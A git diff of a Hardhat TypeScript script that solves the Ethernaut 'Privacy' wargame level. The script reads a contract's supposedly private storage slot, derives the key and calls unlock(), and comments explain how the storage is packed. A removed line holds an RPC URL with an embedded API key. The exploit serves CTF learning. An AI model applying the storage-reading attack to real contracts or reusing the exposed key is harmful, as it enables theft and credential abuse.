@@ -1,34 +1,23 @@
-import { artifacts, ethers } from "hardhat";
-import { deployContract } from "../../utils/deployContract";
+import { ethers } from "hardhat";
 import { abi } from "../../artifacts/contracts/12.Privacy/Privacy.sol/Privacy.json";
-import { BigNumber, Contract } from "ethers";
-import { displayEthBalance } from "../../utils/getEthBalance";
-import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
+import { Contract } from "ethers";
+import { displayResult } from "../../utils/displayResult";
 
-function setTargetContract() {
-  const contractAddress = "0x3D81f0175F85B453b2F9eB4EC5E03B52a3E0C8f3";
-  return new Contract(contractAddress, abi);
-}
-
-async function checkSucces(attacker: SignerWithAddress, target: Contract) {
-  const response = await attacker.provider!.getStorageAt(target.address, "0x0");
-  console.log("Success:", parseInt(response, 16) === 0);
-}
+const targetAddress = "0x83DdFB34cCAd0b38b2F1415D201A937D724E84ce";
 
 async function main() {
-  // const targetAddr = "0xBEdd2Bca152E2c7E55645CD7d585cd313FacbDF2";
-  const privacy = setTargetContract();
   const [attacker] = await ethers.getSigners();
+  const target = new Contract(targetAddress, abi, attacker);
 
-  const provider = new ethers.providers.JsonRpcProvider(
-    "https://eth-rinkeby.alchemyapi.io/v2/TMfNFHkOWc5WIHWdkvGGWlmALUJmSW1v"
-  );
-  const slot5 = await provider.getStorageAt(privacy.address, "0x5");
+  const slot5 = await ethers.provider.getStorageAt(target.address, "0x5");
   const key = slot5.slice(0, 34);
-  const tx = await privacy.connect(attacker).unlock(key);
+  const tx = await target.connect(attacker).unlock(key);
   await tx.wait();
-
-  checkSucces(attacker, privacy);
+  const isLocked = !!(await attacker.provider!.getStorageAt(
+    target.address,
+    "0x0"
+  ));
+  displayResult(isLocked);
 }
 
 main().catch((error) => {
@@ -37,11 +26,11 @@ main().catch((error) => {
 });
 
 // explanation:
-// Data are organized by 256 bit packages. But to avoid loss of space, data are sometimes
-// gathered.
+// Data is stored in 256 bit slots. But to avoid loss of space, data is sometimes
+// packed.
 // In this case the data is organised this way :
 // slot[0] = 0x0000000000000000000000000000000000000000000000000000000000000000
-//  --> locked variable
+// --> locked variable
 // slot[1] = 0x0000000000000000000000000000000000000000000000000000000062bcd019
 // --> ID variable
 // slot[2] = 0x00000000000000000000000000000000000000000000000000000000d019ff0a
